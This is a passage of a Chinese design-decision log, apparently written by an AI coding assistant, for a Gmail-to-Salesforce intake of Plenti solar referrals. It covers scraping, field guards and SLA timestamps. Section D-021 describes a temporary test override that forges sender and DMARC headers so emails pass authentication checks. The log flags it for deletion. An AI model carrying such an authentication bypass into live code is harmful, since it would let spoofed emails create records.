| cookie | `document.cookie` 长度 0 —— 纯靠 URL 里的 token 授权 |
| `<script>` / `<iframe>` | 各 0 个 |
| 服务器原始 HTML | 直接含三项数据,与渲染后 DOM 一致 |
| 大小 | 约 43K 字符(52KB 字节,UTF-8 多字节) |

**结论:纯静态页,`UrlFetchApp.fetch()` 直接可取,不需要无头浏览器。**

### 页面上有什么、没有什么(全文搜索结果)

页面**只有三项**:Customer name / Customer address / Renewable systems。

Jack 猜测模板里可能残留完整收件人变量 —— **搜过了,没有**:

| 搜索 | 结果 |
|---|---|
| `0400000000` | 0 处 |
| 任何澳洲手机号形态 | 0 处 |
| 客户邮箱 | 0 处 |
| 任何邮箱地址 | 只有 `renewables-referrals@plenti.com.au` —— **Plenti 自己的服务邮箱,按 §5.2 绝不可当客户邮箱** |
| HTML 注释(138 条) | 全是 Outlook 条件注释,无数据 |
| `display:none` 元素(22 个) | 全是布局与预览文本,无数据 |
| meta 标签 | 全是渲染控制,无数据 |
| View in Portal 链接 | `https://portal.plenti.com.au/`,**不带 lead id** |

**所以电话和客户邮箱拿不到,自动化到不了"零人工补录"。** delivery token 是
页面上唯一的稳定标识。

### ⚠️ 解析的关键坑:每个标签在页面上出现两次

模板为桌面/移动两套布局各渲染一份:

```
第一组   <strong>Customer name</strong>  →  <p text-align:right>Gabby TEST</p>
第二组   <strong>Customer name</strong>  →  <p></p>          ← 空的
第二组   <strong>Renewable systems</strong> → <p>[]</p>      ← 字面量 []
```

**朴素的"找到标签就取下一段文本"会取到第二组的空值。**

配对算法:按文档顺序扫描 `<p>` 序列,每个标签向后找值,**撞到下一个标签就停**。
第二组标签后面紧跟空值和下一个标签,天然配不出值;只有第一组能配出。
值优先取 `text-align: right` 的段落(模板用右对齐区分值列),取不到再退回该区间
内第一个非空普通段落。`[]` 与空串一律视为"没取到"。

### 字段拆分:能确定就拆,不能就整串保留

- **姓名不拆。** 页面只给一个 "Customer name",拆 first/last 是猜。整串进
  `LastName`,Salesforce 的 Name 显示完全一样,而且不会切错复合姓氏。
- **地址轻量拆。** 只认最保守的 `<街道>, <城市> <州> <四位邮编>`,州必须是八个
  法定缩写之一。**匹配不上就整串塞 `Street`,不猜** —— 与 D-018 不清洗正文同
  一条理由:一个样本撑不起更激进的规则。

### 判定门的语义变更 ⚠️

原来:`kind==='referral' && confidence==='high'` 才建 Lead。
现在:**`kind==='referral' && referralId`(拿到 delivery token)就建。**

理由是 Jack 的 R8 第 6 点:

> 绝不能因为抓取失败就不建 Lead —— SLA 时钟不等人。

**身份与数据分开对待**:token 拿到 = 身份确定;字段抓到 = 数据完整。
`confidence` 从"门"降级为"标记",记录数据完整度,不再决定建不建。

**"认不出来转人工"原则没有松动** —— 没有 browser-view 链接的邮件
(`kind==='unknown'`)依旧一律转 review,一封都不建。

降级建出的 Lead 有三重标记:`state.reason` 带 `[DEGRADED]`、
Description 里写 `[BROWSER VIEW UNAVAILABLE — open the link in the raw email
for customer details]`、`Plenti_Parsed_JSON__c` 里 `browserView.degraded=true`
并记录失败原因。

### 连带变更:客户邮箱不再是必要条件

Plenti **从不**提供客户邮箱。原来 `plResolve_` 在没有客户邮箱时转 review ——
那等于永远不建 Lead。

现在:主键换成 delivery token;**取不到客户邮箱就不写 `Email` 字段**。
§5.2 真正禁止的是"拿 Plenti 的地址当客户邮箱",这一条继续严守 ——
有断言验证 `Email` 字段是被省略而不是被填成发件人地址。

⚠️ **已知能力退化**:规格 §5.5 的跨邮箱去重靠客户邮箱查询,Plenti 路径通常
没有邮箱,**这一层实际上失效了**。info 与 eDocs 同时收到同一客户时不再能自动
拦截。记为 **Q15**。

### Q6 关闭:`plFindReferral_` 从 fail-closed 桩落地为真实查询

delivery token(URL 末段 base64,每封邮件唯一)存 `Plenti_Lead_ID__c`,
`plFindReferral_` 按该字段 SOQL 查询。同一 token 已建过就返回既有 Lead ——
这一层同时覆盖"同一封邮件跑两次"和"同一转介重发成新邮件"。
命中多条则抛错要人工核查(Unique 约束本应挡住,抛错是防它没勾上)。

⚠️ **该查询要求 `Plenti_Lead_ID__c` 已存在。字段不存在 → `INVALID_FIELD`
→ error 状态 → 触发 L-01(防重锁不回滚)。启用前必须先建字段。**

### 留底字段怎么分 —— 单独开一个字段

Jack 让我定。**`Plenti_Browser_View_HTML__c` 独立于 `Plenti_Raw_Email__c`**,
不合并。四条理由:

1. **尺寸**:两份 HTML 各约 40K+,合并可能撑破 131,072,而截断掉的正是审计原件
2. **来源可分**:两者来自不同系统、不同时刻、可靠性不同;混成一坨就无法只对
   其中一份重跑解析
3. **失败可辨**:抓取会失败。独立字段下"空 = 抓取失败"含义明确,合并则要靠标记
4. **D-014 的本意**:审计原件不能是派生物,拼接就把它变成了派生物

抓取时间戳记在 `Plenti_Parsed_JSON__c` 的 `browserView.fetchedAt`,不单开
DateTime 字段 —— 少一个字段要建。**这类链接可能有有效期**,时间戳是判断页面
新鲜度的依据。若日后需要按抓取时间查询,再加 DateTime 字段。

### ⚠️ UrlFetchApp 没有超时参数

Jack 要求"设一个合理的 timeout"。**Apps Script 的 `UrlFetchApp.fetch` 不提供
可配置的 timeout 选项** —— 我没有办法在这一层设。已做的是
`muteHttpExceptions: true`(任何 HTTP 状态都不抛错)+ 全程 try/catch,
**任何失败都落在返回值里由调用方降级,不会抛出去中断流程**。
真实耗时等 Phase 4 观察后再评估是否需要更强保护。

### 任务 A 随 R8 落地,任务 B(upsert)仍未做

R8 第 4、5 点要求写 `Plenti_Lead_ID__c` 和留底字段,没有 D-013 的字段映射就
无法实现,因此**任务 A 的存储结构随本轮一起落地**。

**任务 B 的 upsert 没做**,按 Jack 的"先只存字段,upsert 等这一轮跑通再切"。
当前写入路径仍是 `POST /sobjects/Lead` + 事前 SOQL 查重。

---

## D-020 ⚠️ 离线注入测试入口 —— Phase 4 结束后必须删除

**日期** 2026-09-09 · **决定人** Jack · **阶段** R9 · **状态:🔴 临时代码**

### 为什么需要

eDocs 组还没建好,进组遥遥无期。目前唯一的真实样本是 Lily 转发到 Jack 收件箱
的那封 "Fwd: Action required: New lead"。**转发件没有 `List-ID` 头**,主流程的
`list:<组地址>` 查询搜不到它。

### 为什么不改主流程查询

Jack 的判断,我完全同意并原样记录:

> 我不想为了测试去改主流程的查询条件 —— 那会引入一个上线前必须记得改回来的
> 临时状态,风险太大。

`src/Code.gs` 本轮**一个字节都没动**,有 `git diff` 为证。

### 覆盖与不覆盖

| | |
|---|---|
| **绕过** | `list:` 查询、watermark 逻辑 —— 只有这两件 |
| **覆盖** | 两道安全开关 → script lock → 白名单检查 → 解析 → browser view 抓取 → 建 Lead → 标签同步 → 两张 Sheet 日志 |
| **不覆盖** | **组投递识别**(`list:` 查询本身)。等组建好后单独补测这一环 |

⚠️ **两道安全开关照常生效,这个入口不绕过它们**(规格 §3 禁止 #3),有断言。
⚠️ 照常持有 script lock,避免与定时触发器打架。

### `force` 参数

`plTestFromMessageId(msgId, true)` 可重跑已处理过的邮件。**不会**清除
`IV2_CREATE_` 防重锁,所以重跑不会重复建 Lead —— 它会按 delivery token 找到
既有 Lead 并返回。这本身就是一条值得跑的幂等性验证,有断言。

### 配套的 `plTestFindMessages(query)`

只读,列出匹配 Gmail 查询的消息 ID。

**为什么需要**:Gmail 网页地址栏最后那段(形如 `FMfcgzQb...`)是新版**会话**
ID,与 `GmailApp.getMessageById()` 需要的十六进制**消息** ID 不是同一个东西,
直接抄地址栏多半取不到邮件。

### ⚠️ 澄清一处预期偏差:链接丢失 ≠ 降级建 Lead

Jack 的原话是"如果链接提取失败,R8 的降级路径应该生效(只建 Lead、标记
BROWSER VIEW UNAVAILABLE)"。**这里把两种情况混在了一起**,D-019 的实际语义是:

| 情况 | 行为 | 理由 |
|---|---|---|
| **有链接,抓取失败** | ✅ 降级建 Lead,标 `[BROWSER VIEW UNAVAILABLE]` | token 拿到了 = 身份确定,SLA 时钟不等人 |
| **完全没有链接** | ❌ 转 review,**不建** | 没有 delivery token 就没有稳定标识。建了之后同一转介重发会建出第二个 Lead(§7 验收表明确禁止) |

**想在没有链接时也建 Lead,用已有的 `PLENTI_FORCE_CREATE`(D-017)即可**,
它会合成 `FORCED-<msgId>` 作为 token。不需要为此新开口子。三种情况都有断言。

### 🔴 删除清单(与 D-017 一起执行)

```bash
grep -rn "R9 临时\|R9 离线注入\|D-020\|plTestFromMessageId\|plTestFindMessages" src/
```

| 文件 | 删什么 |
|---|---|
| `src/Plenti.gs` | 整节 "R9 离线注入测试入口"(`plTestFromMessageId` + `plTestFindMessages`) |
| `src/PlentiTests.gs` | 整个 `testPlentiTestEntryPoint` 及入口里的调用;助手 `plTestWithGmail_` / `plTestWithSheet_` |

删完 `node test/offline.cjs` 应回到 35 项全绿。

---

## D-021 ⚠️ 测试用发件人覆盖 —— Phase 4 结束后必须删除

**日期** 2026-09-09 · **决定人** Jack · **阶段** R10 · **状态:🔴 临时代码**

### 为什么需要

R9 跑通到了身份验证这一步就卡住:

```
[R9] browser-view link: https://e.customeriomail.com/deliveries/...   ← 转发件保住了链接
[R9] allowlist matched: jack.liu@sunterra.com.au                       ← 白名单也过了
[R9] reason: Sender could not be determined from X-Original-Sender     ← 卡在这
```

`X-Original-Sender` 只有 Google Groups 投递时才加,转发件没有。组还没建好,
拿不到真正经过组投递的邮件,但**除身份验证外的所有环节今天都能验证完**。

`PLENTI_FORCE_CREATE` 帮不上忙 —— 它按设计不绕过这道门(D-019 的
"认不出来转人工没有松动")。Jack 认同这个设计,不改。

### ⚠️ 它伪造的比"发件人"多

Jack 的要求是"把它当作 X-Original-Sender 的替代"。**光这样不够**:
`isPlentiSource_` 是四步串联的,转发件同样没有
`X-Original-Authentication-Results`,只覆盖发件人会在第 3 步再卡一次。

所以这层包装在**真实头缺失时**补一个 `dmarc=pass`;真实头存在时原样透传,
**绝不覆盖真值**(有断言)。

**结论:开着这个属性时,规格 §5.1 的可信验证整个是假的,不只是发件人那一步。**
它只用来在组建好之前把后续环节跑通。**进组之后必须单独补测身份验证这一环** ——
这是本项目安全性最关键的控制,不能因为测试通过就认为它验证过了。

### 实现方式:包一层 message,不在主流程里加分支

`plTestOverrideMessage_(message, sender)` 返回一个代理对象,只改
`getHeader` 对两个身份头的响应,其余全部委托给真实邮件。

**`plProcess_` 及其下游一个字节都没改** —— 它们只是收到一个 `getHeader`
行为不同的对象。`src/Code.gs` 本轮零改动。

### 主流程不受影响 —— 两道锁

| 锁 | 内容 |
|---|---|
| **静态**(`test/offline.cjs`) | `PLENTI_TEST_SENDER_OVERRIDE` 在 `Code.gs` 中出现次数必须为 **0**;在 `Plenti.gs` 中只允许出现在 R10 块内;`plTestSenderOverride_` 只允许被定义一次、调用一次 |
| **行为**(`PlentiTests.gs`) | 属性设上之后,直接对同一封转发件调 `plProcess_`,判定结果必须与未设置时**逐字相同**,且不写任何东西 |

### 两处快速失败

| 配置错误 | 行为 |
|---|---|
| 值不含 `@` | 抛错 `must be an email address` |
| 值的域名 == `INTERNAL_DOMAIN` | 抛错并说明:该邮件会被判为 internal 静默跳过,应改用真实 Plenti 发件地址 |

另有一条只提示不拦截:值不在 `PLENTI_TRUSTED_SENDERS` 里时打日志说明
"验证仍会在第 2 步失败",避免又白跑一轮。

### 配套:建完回读五个自定义字段

`plTestVerifyLead_(recordId)` 在建 Lead 之后回读并打印
`Plenti_Lead_ID__c` / `Plenti_Received_At__c` / `Plenti_Raw_Email__c` /
`Plenti_Browser_View_HTML__c` / `Plenti_Parsed_JSON__c`,**只打长度不打内容**
(其中两个是 40KB HTML)。字段不存在时捕获异常并提示,不中断。

### 🔴 删除清单(与 D-017 / D-020 一起执行)

```bash
grep -rn "R10 临时\|D-021\|PLENTI_TEST_SENDER_OVERRIDE\|plTestSenderOverride_\|plTestOverrideMessage_\|plTestVerifyLead_" src/ test/
```

| 文件 | 删什么 |
|---|---|
| `src/Plenti.gs` | `plTestSenderOverride_` / `plTestOverrideMessage_` / `plTestVerifyLead_`;`plTestFromMessageId` 里的 override 块与回读调用 |
| `src/PlentiTests.gs` | 整个 `testPlentiSenderOverride` 及入口调用 |
| `test/offline.cjs` | R10 静态守卫那一段 |
| Script Properties | 删掉 `PLENTI_TEST_SENDER_OVERRIDE` 键本身 |

删完 `node test/offline.cjs` 应回到 36 项全绿。

---

## D-022 清理模板遗留字段,并加一道长期字段守卫

**日期** 2026-09-09 · **决定人** Jack · **阶段** R11,已实现

### 触发

R10 之后 browser view 抓取全线通过,但建 Lead 报错:

```
SF 400 INVALID_FIELD
No such column 'Lead_Category__c' on entity 'Lead'
```

`Lead_Category__c` 是从 Lily 的 handoff 模板继承来的,**Sunterra 的 org 里
从来没有这个字段**,却被硬编码进 `ivLeadFields_()` 的 SOQL。

⚠️ **Salesforce 是全有全无:一个字段不存在,整个请求就失败。**
所以这类问题不会只坏掉一个字段,而是整条路径全断。

### Sunterra sandbox 上确认存在的自定义字段(Jack 提供)

```
Plenti_Lead_ID__c
Plenti_Raw_Email__c
Plenti_Browser_View_HTML__c
Plenti_Parsed_JSON__c
Contact_Attempt_Count__c
```

**除此之外只能用 Salesforce 标准字段。**

### 审计结果:三处问题,不止 Jack 发现的那一处

| 字段 | 位置 | 处置 |
|---|---|---|
| `Lead_Category__c` | `ivLeadFields_()` 的 SOQL | ✅ **已移除** |
| `Plenti_Received_At__c` | `plLeadPayload_` 写入 + `plTestVerifyLead_` 回读 | ✅ **已移除**,见下方 🔴 |
| `StateCode` / `CountryCode` | SOQL 与 payload 双向 | ⚠️ **保留**,理由见下 |

`Legacy.gs` 里的 `ivRefreshReview_` / `ivProcess_` 也引用 `Lead_Category__c`,
**未处理** —— 那是隔离的死代码,主干一次也不调用它(有静态守卫),
而且本轮不允许改 Legacy.gs。

### 🔴 `Plenti_Received_At__c` —— 这是权宜之计,不是最终方案

字段没建出来,写它会让整个请求失败,所以从 payload 里摘掉了。
**时间戳没有丢**:`parsed.receivedAt` 随 `Plenti_Parsed_JSON__c` 一起落库。

**但这不能就这样上线。** 规格 §5.3 明确要求:

- PLT001 SLA **必须**按该字段计算,**不用 `CreatedDate`** —— 轮询延迟
  (10–15 分钟)加上"有 error 则 watermark 不前移"会放大偏差
- SLA 未达标,**Plenti 可立即终止合同,没有补救期**

JSON 里的时间戳能满足审计,但**不可用于报表查询**,做不了 SLA 统计。

**我的建议:Jack 去建这个字段。** 规格里那条设计不是可选项,而是合同约束的
直接落地。字段建好后 `plLeadPayload_` 里放开一行即可,`plTestDescribeLead`
检测到字段存在时会主动提醒这件事。

### ⚠️ `StateCode` / `CountryCode` 为什么保留

这两个是**条件字段** —— 只有启用了 State & Country Picklists 的 org 才有。
它们不在 Jack 给的白名单里,但它们是**标准字段**,不是自定义字段。

保留的依据(是推断,不是验证):

1. 本次报错点名的是 `Lead_Category__c`,而它在 SELECT 列表里排在
   `StateCode` / `CountryCode` **之后**。SOQL 报的是第一个未知列 ——
   若 `StateCode` 也不存在,应该先报它。
2. handoff 的 `README_CN.md` 把"标准地址代码字段 `StateCode`、`CountryCode`
   及相应 picklist 配置"列为 info 邮箱项目的既有 org 依赖,说明生产 org 启用了
   该配置;沙箱是生产的刷新副本。

**但这仍然是推断。** `plTestDescribeLead` 会给出确定答案,并单独点名这两个字段。
**建议 Jack 重试之前先跑一次那个函数**,5 秒钟,把猜测彻底去掉。

### 两道新守卫

**① `plTestDescribeLead()` —— 长期开发工具,不随临时代码删除**

取 Lead describe,和代码实际用到的字段比对,列出"代码要用但这个 org 里没有"
的字段;另外单独报"存在但不可写"的字段。切生产时同样用得上 ——
生产的字段和沙箱不一定一样。

**故意不手工维护字段清单** —— 那种清单一定会和代码漂移,而漂移的后果正是
这次的运行时 400。改为:

- 读字段 ← 直接拆 `plLeadFields_()` 的返回值
- 写字段 ← 用一个把所有可选字段都填满的探针跑一遍 `plLeadPayload_`,取 keys

这样 `plLeadPayload_` 一改,自检自动跟着变,不会漏。当前覆盖 **28 个字段**。

⚠️ 函数名**没有**下划线后缀。Apps Script 编辑器的 Run 下拉框不列出以 `_`
结尾的函数,叫 `plTestDescribeLead_` 就点不着了 —— Jack 原话里的命名带下划线,
这里有意偏离。

**② 自定义字段白名单(`test/offline.cjs`)—— 长期守卫**

断言代码触及的自定义字段集合**恰好等于**上面那五个。用运行时字段集
(`plLeadFieldsUsed_()`)而不是文本扫描,所以不会漂移。

有一条断言专门复现本轮这一发:把 `Lead_Category__c` 塞回字段列表,
自检必须报出来 —— 证明这道守卫**本来就能在撞 Salesforce 之前拦住它**。

---

## D-023 可选 Lead 字段用 describe 探测,不用开关

**日期** 2026-09-09 · **决定人** Jack(方式由我选) · **阶段** R12,已实现

### 背景

`Plenti_Received_At__c` 已在沙箱建好(Date/Time),按 D-022 放开写入。
但**生产还没建**,切过去时不能被它卡住 —— Salesforce 是全有全无,
一个字段不存在整个 POST 就失败。

Jack 给了两个选项:describe 探测,或 Script Property 开关,让我选。

### 为什么选探测 —— 开关的两种默认值都不安全

| 默认值 | 后果 |
|---|---|
| 默认**关** | 生产建好字段后没人记得打开 → PLT001 的计时字段**静默为空**。而这是合同 SLA 的计算依据,静默失败是最坏的一种 |
| 默认**开** | 切生产当天直接被 `INVALID_FIELD` 卡死,正是这次要避免的事 |

探测则两边都自洽,**不需要任何人记得做什么** —— 字段在就写,不在就跳过。

### 实现:按执行缓存的字段表

`plLeadFieldMap_()` 取一次 Lead describe,缓存在函数属性上(与模板
`ivReq_.token` 同一手法)。

- **一次 Apps Script 执行只发一个 describe**,且只在真的要建 Lead 时才触发。
  没有新线索的轮次一次请求都不发。有断言:连建三个 Lead 只发一次 describe。
- **describe 本身失败时返回空表并记住失败** —— 跳过可选字段但**照常建 Lead**。
  SLA 时钟不等人,宁可少一个字段也不能不建;收件时间仍在
  `Plenti_Parsed_JSON__c` 的 `receivedAt` 里。有断言:失败也只发一次,
  不会在一批邮件里形成重试风暴。

`plTestVerifyLead_` 的回读列表同样按探测结果拼 —— 查一个不存在的字段
会让整条 SOQL 报错。

### ⚠️ 值必须来自邮件时间,不是脚本时间

```javascript
payload.Plenti_Received_At__c = message.getDate().toISOString();
```

**刻意直接取 `message.getDate()`,不经过 `parsed.receivedAt`** —— 后者会流经
解析、可能被 `plForcedParse_` 之类改写,少一层被污染的可能。

规格 §5.3 明确不用 `CreatedDate`:轮询 10–15 分钟一次,创建时间必然晚于接收
时间,而"有 error 则 watermark 不前移"会放大这个偏差。**取错了整个 SLA 统计
都是错的,而且事后无法从记录里还原。**

四条断言锁住这一点:

1. 等于 `message.getDate().toISOString()`
2. 等于 fixture 的确切字面量
3. **与"现在"相差超过 60 秒** —— 专门挡住有人改成 `new Date()`
4. 即使 `parsed.receivedAt` 被篡改成别的值,写入的仍是邮件时间

已反向验证:把取值改成 `new Date().toISOString()`,套件立刻变红并指出
拿到的是运行时间。

### 自检清单里可选字段的处理

`plLeadFieldsUsed_()` **无论探测结果如何都列出可选字段**,并打 `optional` 标记。
否则探测失败时它会从清单里消失,正好躲开检查。

`plTestDescribeLead()` 把可选字段缺失单独报成 `ⓘ optional and absent —
skipped at runtime, the request still succeeds`,不混进红色的 MISSING 清单 ——
那是预期内的降级,不是错误。

### Q16 关闭

字段已在沙箱建好并放开写入。⚠️ **生产上仍未建** —— 探测保证不会卡住,
但在建好之前生产的 PLT001 仍然无法从专用字段统计。

---

## D-024 review 状态的自动解除:信号是"联系方式出现了"

**日期** 2026-09-10 · **决定人** Jack · **阶段** 已实现,**Q9 关闭**

### 先纠正一个前提

Jack 观察到"Plenti 路径下 `SF-Lead-Created` 好像永远不会亮"。**实测不成立** ——
`ivLeadLabelFlags_` 里 `created` 和 `review` 是两个独立判断,不互斥:

| 状态 | Created | Review | Updated |
|---|:--:|:--:|:--:|
| 新建 Plenti Lead | ✅ | ✅ | — |
| 降级建出的 Lead | ✅ | ✅ | — |
| 已存在、未新建 | — | ✅ | — |
| 不可信 → review | — | ✅ | — |

handoff 的 `README_CN.md` 明写了这是设计:「标签按整个会话汇总,因此 Created
和 Review 可以同时存在」。

**Plenti 路径上真正的死标签是 `SF-Lead-Updated`** —— 它唯一的触发条件是
`verifiedFields` 非空,而那只有 `ivRecordReply_` 会写,那个函数在 `Legacy.gs`
里、主干一次也不调用(有静态守卫)。这是 D-007 定位调整的必然结果,不是缺陷。

### 为什么"已补全"程序判断得了

Jack 原本认为这个状态程序判断不了。**能判断**,而且信号异常干净。

Portal 那边的事实(Jack 2026-09-10 查清):

1. **联系方式只在 Plenti Portal 里有。** 邮件正文和 browser view 页面都没有 ——
   43KB HTML 全文搜过,电话和邮箱 0 处命中
2. **Portal 登录要双重验证,每次都要收验证码,账号还是发给老板个人的** ——
   自动化不现实
3. Portal 的 Referrals 页面有 Export to Excel,六列
   Customer / Email / Date created / Phone / Systems / Status,**没有 referral ID**

所以 **`Email` / `Phone` / `MobilePhone` 里任何一个变成非空,只可能是人填的**。
这就是解除信号。

**「待补联系方式」是每一条 Plenti 线索的必经状态,不是边缘情况。**

### 实现

`plRefreshReview_` 从空操作桩换成实现。管道本来就铺好了 ——
`runIntakeV2` 的消息循环和 `ivRefreshOutstanding_` 每轮都调用它。

解除条件三选一(后两条沿用模板 `ivRefreshReview_` 的意图):

| 条件 | 含义 |
|---|---|
| `Email` / `Phone` / `MobilePhone` 任一非空 | 有人补了联系方式 |
| `IsConverted` | 线索已转换 |
| `Status === 'Unqualified'` | 有人判定不合格 |

### 三处刻意的设计

**① 成本守卫:没有 Lead 记录的 review 一次查询都不发。**

前三行守卫决定了只有"已建出 Lead 且仍在 review"的消息才会发 SOQL。
进组之后所有非 Plenti 噪音邮件的 review 状态都没有 `record`,
**不会为它们查一次 Salesforce**(Q10)。有断言。

**② 字段列表写死成最小集,不用 `ivLeadFields_()`。**
查得更便宜,也避开 `StateCode` 那类条件字段的坑(D-022)。

**③ 查询失败绝不抛出去。**
`runIntakeV2` 的主循环调用这里时**没有包 try/catch**,抛出去整轮就死了。
状态刷新失败只是标签晚点摘;建 Lead 和 SLA 时钟才是要紧的。记日志后返回。

### 由此得到的两态工作流 —— 不需要新标签

| 标签组合 | 含义 |
|---|---|
| `Created` + `Review` | **待补联系方式** |
| `Created`(Review 熄灭) | **已补全** |

Jack 想要的两个状态,现有标签对就能表达。**不改名,不加新标签。** 有断言验证
这个转换,并确认 `created` 标志在状态变 `done` 之后仍然保留。

### 尚未覆盖的一处

review 解除**不会回写 Messages 表**(D-018)—— 那张表是处理时的诊断记录,
不是实时状态板。想在表里看到状态流转,需要另做,本轮不做。

### 将来可能的方向(Jack 提出,不在本轮)

人每天从 Portal 导出一次 Excel,程序读文件**按姓名匹配**补全联系方式。
⚠️ 注意导出里**没有 referral ID**,只能按 Customer 姓名匹配,重名会有歧义 ——
真要做的时候这是首先要解决的问题。

---

## D-025 systems 落到可见处;姓名写入方式的确认

**日期** 2026-09-10 · **决定人** Jack(方式由我判断) · **阶段** R13,已实现

### ① systems:专用字段 + Description 备份,两处都写

**问题**:browser view 抓到 name / address / systems 三项,前两项进了标准字段,
**systems 只落在 `Plenti_Parsed_JSON__c` 里** —— 跟进的人在 Lead 页面上看不到
客户想装什么,总不能让他去读 JSON。

**决定:新建 `Plenti_Systems__c`,同时在 Description 摘要里带一份。**

为什么要专用字段而不是只塞 Description:

1. **可报表、可筛选。** Description 是自由文本,分组和筛选都做不了。
   规格 §1 要求每季度末后 10 个工作日内提交 Schedule 3 报告,PLT002 的
   线索→报价转化率也可能要按系统类型切分 —— 这两件事都需要一个能 group by
   的字段。
2. **列表视图能显示。** 跟进的人在列表里就能看到,不用点进每条记录。
3. 从 Description 里把值反解析出来是脆的,而我们已经在 R11 上吃过
   "字段名硬编码在字符串里"的亏。

为什么**还要**在 Description 里留一份:

字段现在**还没建**。按 D-023 的探测机制,字段不存在时运行期会自动跳过 ——
如果只写字段,那么在 Jack 建好之前 systems 依旧只存在于 JSON 里,问题没解决。
Description 那份保证**立刻可见**,而且字段建好之后它也不多余:摘要一行里
同时有收件时间、解析字段数和系统类型,一眼就够。

⚠️ **这不违反 D-012。** 那条禁的是"referralId 之外的**内部标识符**"
(application ID、broker ID、客户编号)。systems 是**客户需求本身**,
正是 D-012 明确允许的"销售必要信息"。

Description 现在长这样:

```
[Intake: <msgId>] Plenti referral received <ISO8601>; 3 fields parsed; systems: Battery, Solar
```

仍然是一行,marker 仍在最前(D-013 的承重结构),仍不含邮件正文。

#### 字段规格(交给 agent 建)

| 项 | 值 |
|---|---|
| Object | **Lead** |
| Data Type | **Text** |
| Length | **255** |
| Field Label | `Plenti Systems` |
| Field Name | `Plenti_Systems` → API 名 `Plenti_Systems__c` |
| Required | 否 |
| Unique / External ID | **都不勾** |
| Description | `客户在 Plenti 转介里选择的可再生能源系统,取自 browser view 页面的 Renewable systems 字段。逗号分隔,例如 "Battery, Solar"。超长截断并标注 [TRUNCATED]。` |
| FLS | 对集成用的 Permission Set 可见且可编辑;对跟进人可见 |
| Page Layout | **加到 Lead 布局上** —— 这个字段存在的全部意义就是让人看见 |

⚠️ **为什么是 Text 而不是多选 Picklist**:多选 Picklist 报表更好用,但
**写入一个不在选项列表里的值会让整个请求失败** —— 正是 R11 那一类事故。
目前只见过 `Battery, Solar` 一种取值,值域还不知道。先用 Text 兜住,
等积累若干真实转介、看清完整值域之后再评估要不要迁到多选 Picklist。

### ② 姓名:代码是对的,问题在页面布局

Jack 观察到 Lead 页面上 Name 显示 `Gabby TEST`,但 First Name / Last Name
两格都是空的。

**实跑确认代码正确**:

```
payload 里与姓名相关的键:
  LastName = "Gabby TEST"
  FirstName 存在吗? false
```

整串写进 `LastName`,`FirstName` **根本不发送**(不是发空串)。所以记录里
Last Name 就是 `Gabby TEST`,Name 作为复合字段显示同一个值,两者一致。

**页面上 Last Name 显示为空是布局层面的事,不是数据问题。** Lead 的 Name 在
Lightning 里是复合字段,布局怎么摆、子字段怎么渲染,和记录里存了什么是两回事。

**不改代码。** 但为了以后不用靠肉眼判断,`plTestVerifyLead_` 的回读列表加上了
`Name` / `FirstName` / `LastName` —— **回读一次才是权威答案**,页面显示不是。

姓名不拆分的原因见 D-019:页面只给一个 "Customer name",拆 first/last 是猜,
而且会切错复合姓氏。Salesforce 的 Name 显示效果完全一样。

### 顺带:两道守卫的调整

**① 自定义字段白名单拆成"必需 / 可选"两类。**
原来一份清单叫"确认存在的字段",但 `Plenti_Received_At__c`(生产未建)和
`Plenti_Systems__c`(尚未建)都是探测门控的可选字段 —— 它们**允许暂时不存在**。
混在一起会让守卫的断言语义不成立。现在:

- **必需**(5 个):无条件写入,缺一个整个请求就失败
- **可选**(2 个):org 里没有就自动跳过;但**必须显式列出**,
  否则等于没人审过就混进了写入路径

**② 新增:孤儿测试用例守卫。**
定义了却没接进 `runPlentiRegressionTests` 的用例是**静默失效**的 ——
套件照常全绿,但那部分根本没跑。本轮我就漏接了一次入口,靠人工核对才发现。
现在 `test/offline.cjs` 强制断言每个 `testPlenti*` 函数都被入口调用,
已反向验证:摘掉一行入口调用,套件立刻变红。

---

## D-026 `created` 是持久语义;Lead_ID 字段属性由 describe 说了算

**日期** 2026-09-10 · **决定人** Jack · **阶段** R14,已实现

### ① SF-Lead-Created 会被摘掉 —— 是我引入的回退,不是设计

**Jack 的推断基本正确,有一处要修正。**

`ivSyncLabels_` 每轮按持久状态重算三个标签,`false` 意味着**主动删除**
(`ivLabel_` 的 `add=false` 走 `removeLabel`)。所以 `created` 一旦丢,
标签就被摘。

但**普通轮询不会重算** —— `plProcess_` 开头 `if(prior&&!force&&prior.state!=='error')return prior;`
直接短路。只有两种情况会:**`force=true` 重跑**(即 `plTestFromMessageId(id,true)`)
和 **error 状态重试**。恰好都是测试与故障恢复时最常走的路径。

复现:

```
第 1 轮(新建)      created=true       → add SF-Lead-Created
第 2 轮(force 重跑) created=undefined  → remove SF-Lead-Created   ← 摘掉了
```

**根因**:模板的 `ivResolve_`(Legacy.gs:81)在按 marker 认出"这封邮件就是这条
Lead 的来源"时会**重新断言 `created:true`**,正是为了让标签跨重跑稳定。
我移植时把这个机制丢了。

### ⚠️ 但"只给 marker 分支加"是个空操作

Jack 选的方案是"只给 marker 匹配加 `created:true`,token 匹配不加"。
**照字面做等于什么都没做** —— 那条分支在 Plenti 路径上不可达:

1. token 查询在它**之前**就返回了
2. 它本身还被 `if(parsed.customer.email)` 挡着,而 **Plenti 从不提供客户邮箱**

**真正的判据不是"走了哪条分支",而是"命中的 Lead 的 Description 里有没有本邮件
的 marker"。** 这恰好精确实现了 Jack 想要的区分:

| token 命中的情形 | Description 带本邮件 marker | `created` |
|---|---|---|
| 同一封邮件重跑 | ✅ | `true` —— 这封邮件建的,标签保住 |
| 同一转介重发成新邮件 | ❌ | `false` —— 那封确实没建过,只亮 Review 让人看是不是重复 |

Jack 的工作流理由原样成立,只是实现位置换了。

### `created` 与 `createdNow` 必须分开

`created` 变成持久语义之后,不能再拿它计数:

| 字段 | 含义 | 用途 |
|---|---|---|
| `created` | **这封邮件建过这条 Lead**(持久) | `SF-Lead-Created` 标签 |
| `createdNow` | **本轮真的发了 POST** | 运行日志计数、reason 文案 |

混用会让 **error 重试把同一条 Lead 重复算进月度对账**。
`runIntakeV2` 的 `stats.created` 和 R9 入口的统计都已切到 `createdNow`
(Code.gs 本轮只改了这一处)。

### ② `Plenti_Lead_ID__c` 的三个属性由 describe 报出

agent 建字段的报告写的是 `Text(255) (External ID) (Unique Case Sensitive)`,
但那是人肉核对的。`plTestDescribeLead()` 现在直接报:

```
[R11] Plenti_Lead_ID__c: type=string(255) unique=true caseSensitive=true externalId=true
```

三条按情况告警:

| 情况 | 告警 |
|---|---|
